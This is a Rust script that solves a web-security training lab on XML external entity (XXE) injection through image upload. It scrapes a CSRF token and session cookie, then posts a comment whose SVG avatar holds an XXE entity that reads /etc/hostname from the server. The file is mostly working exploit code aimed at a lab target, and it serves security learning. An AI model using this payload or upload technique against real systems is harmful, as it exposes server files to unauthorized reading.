/*********************************************************************
*
* Lab: Exploiting XXE via image file upload
*
* Hack Steps:
*      1. Fetch a post page
*      2. Extract the csrf token and session cookie
*      3. Post a comment with the malicious SVG image
*      4. Check the uploaded image for the content of /etc/hostname
*      5. Submit the solution
*
**********************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{
        multipart::{Form, Part},
        Client, ClientBuilder, Response,
    },
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ad200c904af096880a68fe500290079.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Fetching a post page.. ");
    flush_terminal();

    let post_page = fetch("/post?postId=1");

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let session = get_session_cookie(&post_page);
    let csrf_token = get_csrf_token(post_page);

    println!("{}", "OK".green());
    print!("â¦—3â¦˜ Posting a comment with the malicious SVG image.. ",);
    flush_terminal();

    let svg_image = r###"<?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
        <text font-size="16" x="0" y="16">
            &xxe;
        </text>
        </svg>"###;
    let svg_image_name = "image.svg"; // You can change this to what you want
    let avatar = build_avatar(svg_image, svg_image_name);
    let form = build_form(avatar, csrf_token);
    post_comment_with_malicious_image(form, &session);

    println!("{}", "OK".green());
    println!(
        "ðŸ—¹ Check {} for the content of /etc/hostname then submit the solution",
        "/post/comment/avatars?filename=1.png".green(),
    );
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

fn build_avatar(file: &str, file_name: &str) -> Part {
    Part::bytes(file.as_bytes().to_owned())
        .file_name(file_name.to_owned())
        .mime_str("image/svg+xml")
        .expect(&format!(
            "{}",
            "â¦—!â¦˜ Failed to construct the avatar part".red()
        ))
}

fn build_form(avatar: Part, csrf_token: String) -> Form {
    Form::new()
        .part("avatar", avatar)
        .text("csrf", csrf_token)
        .text("postId", "1")
        .text("name", "no one")
        .text("comment", "no comment")
        .text("email", "no_one@hacker.com")
}

fn post_comment_with_malicious_image(form: Form, session: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .multipart(form)
        .send()
        .expect(&format!(
            "{}",
            "â¦—!â¦˜ Failed to post a comment with the malicious SVG image".red()
        ));
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "â¦—!â¦˜ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
